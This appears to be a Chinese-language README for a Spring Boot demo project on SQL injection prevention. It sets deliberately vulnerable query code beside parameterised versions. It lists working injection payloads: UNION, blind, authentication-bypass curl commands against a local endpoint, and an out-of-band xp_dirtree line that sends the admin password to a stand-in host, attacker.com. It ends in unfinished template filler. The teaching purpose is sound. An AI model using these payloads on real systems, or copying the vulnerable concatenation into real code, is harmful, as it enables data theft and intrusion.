<!-- TEMPLATE: 待完善 - 本 README 包含自动生成的模板内容，需要人工精修 -->

# SQL 注入防护示例

## 项目简介

本项目是一个基于 Spring Boot 2.7、JDBC 和 H2 数据库的 SQL 注入防护示例。项目通过对比脆弱代码和安全代码，直观展示 SQL 注入攻击的原理和危害，以及使用 PreparedStatement、JdbcTemplate 参数化查询等防护技术。

## 技术栈

- Java 11
- Spring Boot 2.7.12
- Spring JDBC (JdbcTemplate)
- H2 内存数据库
- Maven

## SQL 注入攻击类型

### 带内注入（In-band SQL Injection）

带内注入是最常见的 SQL 注入类型，攻击者使用相同的通信通道发起攻击和获取结果。

#### 基于错误的注入（Error-based）

攻击者通过构造特殊的输入，使数据库返回错误信息，从中获取数据库结构信息：

```
输入: alice'
SQL: SELECT * FROM users WHERE username = 'alice''
错误: You have an error in your SQL syntax...
```

通过分析错误信息，攻击者可以了解数据库类型、表结构等关键信息。

#### 联合查询注入（Union-based）

攻击者使用 UNION 操作符将恶意查询结果与原始查询结果合并：

```
输入: ' UNION SELECT id, username, password, email, role, active FROM users --
SQL: SELECT * FROM users WHERE username = '' UNION SELECT id, username, password, email, role, active FROM users --'
```

这种方式可以直接获取其他表中的数据，包括敏感信息。

### 盲注（Blind SQL Injection）

盲注不会返回查询结果或错误信息，攻击者通过观察应用行为推断数据。

#### 布尔盲注（Boolean-based Blind）

攻击者构造返回 TRUE/FALSE 的条件，通过应用的响应差异判断：

```
输入: alice' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
```

如果应用返回正常结果，说明密码第一个字符是 'a'；否则尝试其他字符。

#### 时间盲注（Time-based Blind）

攻击者使用数据库的延时函数，通过响应时间判断条件是否为真：

```
输入: alice'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '0:0:5' --
```

如果响应延迟 5 秒，说明条件为真。

### 带外注入（Out-of-band SQL Injection）

带外注入使用不同的通道获取数据，当带内方法不可用时使用：

```
输入: alice'; EXEC master..xp_dirtree '\\attacker.com\share\' + (SELECT password FROM users WHERE username='admin') --
```

攻击者通过 DNS 查询或 HTTP 请求将数据发送到自己的服务器。这种方式不依赖应用的直接响应。

## SQL 注入防护技术

### PreparedStatement 参数化查询（最有效）

PreparedStatement 使用参数占位符（?）代替字符串拼接，数据库驱动会正确处理参数中的特殊字符：

```java
// 危险：字符串拼接
String sql = "SELECT * FROM users WHERE username = '" + username + "'";

// 安全：参数化查询
String sql = "SELECT * FROM users WHERE username = ?";
PreparedStatement ps = connection.prepareStatement(sql);
ps.setString(1, username);
```

PreparedStatement 的工作原理：
1. SQL 语句先被预编译，确定了查询的结构
2. 参数通过独立的通道传输，不会被解释为 SQL 代码
3. 即使参数中包含 SQL 关键字或特殊字符，也只被视为普通字符串

### JdbcTemplate 参数化查询

Spring 的 JdbcTemplate 封装了 JDBC 操作，提供了简洁的参数化查询 API：

```java
// 位置参数
jdbcTemplate.query("SELECT * FROM users WHERE username = ?", rowMapper, username);

// 多个参数
jdbcTemplate.query("SELECT * FROM users WHERE role = ? AND active = ?", rowMapper, role, active);

// LIKE 查询
jdbcTemplate.query("SELECT * FROM users WHERE email LIKE ?", rowMapper, "%" + email + "%");
```

JdbcTemplate 的优势：
- 自动管理数据库连接和资源释放
- 统一的异常处理（转换为 Spring 的 DataAccessException）
- 简洁的 API，减少样板代码
- 内置参数化查询支持，防止 SQL 注入

### 输入验证

输入验证是防御 SQL 注入的辅助手段，应在多个层面实施：

```java
// 白名单验证：仅允许字母数字
if (!username.matches("^[a-zA-Z0-9_]{3,50}$")) {
    throw new IllegalArgumentException("Invalid username format");
}

// 长度验证
if (username.length() > 50) {
    throw new IllegalArgumentException("Username too long");
}

// 类型验证
try {
    Long id = Long.parseLong(inputId);
} catch (NumberFormatException e) {
    throw new IllegalArgumentException("Invalid ID format");
}
```

输入验证原则：
- 使用白名单而非黑名单
- 验证数据类型、长度、格式和范围
- 在服务端进行验证，不要仅依赖前端验证
- 验证应在所有入口点实施

### ORM 使用

使用 ORM 框架（如 JPA、Hibernate）可以有效防止 SQL 注入：

```java
// JPA Repository - 自动参数化
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);

// Criteria API - 类型安全
CriteriaBuilder cb = entityManager.getCriteriaBuilder();
CriteriaQuery<User> query = cb.createQuery(User.class);
Root<User> root = query.from(User.class);
query.where(cb.equal(root.get("username"), username));
```

注意：使用 ORM 并不自动免疫 SQL 注入。如果使用原生 SQL 或字符串拼接，仍然存在风险：

```java
// 危险：即使在 JPA 中
@Query(value = "SELECT * FROM users WHERE username = '" + ":username" + "'", nativeQuery = true)
```

### 最小权限原则

数据库用户应仅拥有必要的权限：

- 应用程序使用的数据库账户不应有 DROP、ALTER 等DDL 权限
- 不应使用数据库管理员账户连接数据库
- 为不同的操作创建不同权限的数据库账户
- 限制对系统表和元数据的访问

```sql
-- 创建只读用户
CREATE USER app_readonly WITH PASSWORD 'readonly_password';
GRANT SELECT ON users TO app_readonly;

-- 创建读写用户（无 DDL 权限）
CREATE USER app_readwrite WITH PASSWORD 'readwrite_password';
GRANT SELECT, INSERT, UPDATE, DELETE ON users TO app_readwrite;
```

## 项目中的代码对比

### 危险代码（VulnerableUserRepository）

```java
public List<User> searchByUsername(String username) {
    String sql = "SELECT * FROM users WHERE username = '" + username + "'";
    return jdbcTemplate.query(sql, rowMapper);
}
```

当输入为 `alice' OR '1'='1` 时，生成的 SQL 为：
```sql
SELECT * FROM users WHERE username = 'alice' OR '1'='1'
```
这将返回所有用户数据！

### 安全代码（SafeUserRepository）

```java
public List<User> searchByUsername(String username) {
    String sql = "SELECT * FROM users WHERE username = ?";
    return jdbcTemplate.query(sql, rowMapper, username);
}
```

相同的输入 `alice' OR '1'='1`，PreparedStatement 会将其作为普通字符串处理：
```sql
SELECT * FROM users WHERE username = 'alice\' OR \'1\'=\'1'
```
不会匹配任何用户。

## API 端点说明

| 方法 | 路径 | 说明 | 安全性 |
|------|------|------|--------|
| GET | `/api/users/search/vulnerable?username=alice` | 不安全的用户搜索 | 危险 |
| GET | `/api/users/search/safe?username=alice` | 安全的用户搜索 | 安全 |
| GET | `/api/users/search/compare?username=alice` | 对比两种方式 | 对比 |
| POST | `/api/users/auth/vulnerable` | 不安全的认证 | 危险 |
| POST | `/api/users/auth/safe` | 安全的认证 | 安全 |

## 使用示例

### 1. 正常查询

```bash
# 安全查询
curl "http://localhost:8082/api/users/search/safe?username=alice"

# 不安全查询
curl "http://localhost:8082/api/users/search/vulnerable?username=alice"
```

### 2. SQL 注入攻击演示

```bash
# 联合查询注入（仅在不安全接口中生效）
curl "http://localhost:8082/api/users/search/vulnerable?username=' UNION SELECT 1,'hacked','pwd','hacked@evil.com','ADMIN',TRUE --"

# 对比查询（安全接口不受影响）
curl "http://localhost:8082/api/users/search/compare?username=' OR '1'='1"
```

### 3. 认证绕过演示

```bash
# 不安全的认证（可能被绕过）
curl -X POST "http://localhost:8082/api/users/auth/vulnerable?username=admin'--&password=anything"

# 安全的认证（不受注入影响）
curl -X POST "http://localhost:8082/api/users/auth/safe?username=admin'--&password=anything"
```

### 4. H2 控制台

访问 http://localhost:8082/h2-console 查看数据库内容：
- JDBC URL: `jdbc:h2:mem:testdb`
- 用户名: `sa`
- 密码: （空）

## 安全最佳实践

### 代码层面

- 始终使用参数化查询（PreparedStatement 或 JdbcTemplate）
- 对所有用户输入进行验证和清理
- 使用 ORM 框架（JPA、MyBatis）时也注意 SQL 注入风险
- 实施代码审查制度，检查 SQL 拼接
- 使用静态代码分析工具检测 SQL 注入漏洞

### 数据库层面

- 实施最小权限原则
- 使用存储过程封装复杂查询
- 启用数据库审计日志
- 定期更新数据库补丁
- 限制错误信息的详细程度

### 架构层面

- 使用 Web 应用防火墙（WAF）作为额外防护层
- 实施输入输出编码
- 使用多层防御策略
- 定期进行安全测试和渗透测试

## 测试用例说明

`SafeUserRepositoryTest` 包含以下测试用例：

- 正常查询返回正确用户
- 不存在的用户返回空结果
- SQL 注入 `' OR '1'='1` 不返回任何结果
- DROP TABLE 注入不影响数据库
- UNION 注入不返回额外数据
- 认证绕过注入不影响认证结果

## 项目结构

```
src/
├── main/
│   ├── java/com/example/demo/
│   │   ├── SqlInjectionPreventionDemoApplication.java
│   │   ├── config/
│   │   │   └── DataSourceConfig.java
│   │   ├── controller/
│   │   │   └── UserSearchController.java
│   │   ├── entity/
│   │   │   └── User.java
│   │   ├── repository/
│   │   │   ├── VulnerableUserRepository.java
│   │   │   └── SafeUserRepository.java
│   │   └── service/
│   │       └── UserSearchService.java
│   └── resources/
│       ├── application.yml
│       ├── schema.sql
│       └── data.sql
└── test/
    └── java/com/example/demo/
        ├── SqlInjectionPreventionDemoApplicationTest.java
        └── repository/
            └── SafeUserRepositoryTest.java
```

## 构建与运行

```bash
mvn clean package
java -jar target/sql-injection-prevention-demo-1.0.0.jar
```

## 总结

本示例项目通过对比脆弱代码和安全代码，清晰地展示了 SQL 注入攻击的原理和危害。使用 PreparedStatement 参数化查询是最有效的防护手段，配合输入验证、最小权限原则和多层防御策略，可以全面保护应用免受 SQL 注入攻击。在实际项目中，应始终遵循安全编码规范，并定期进行安全审计。

## 🎯 学习目标

完成本案例学习后，你将能够：

- ✅ 理解本案例涉及的核心概念
- ✅ 掌握相关的配置与命令
- ✅ 能够在本地环境中复现

## 🚀 快速开始

### 运行演示

```bash
./scripts/demo.sh
```

## 📖 核心概念

### 1. 基本概念

本节介绍本案例涉及的核心概念。

### 2. 适用场景

- 场景 1：学习与实验
- 场景 2：工程实践
- 场景 3：面试准备

## 💻 代码示例

### 基本用法

```bash
# 请根据实际案例替换
./scripts/demo.sh
```
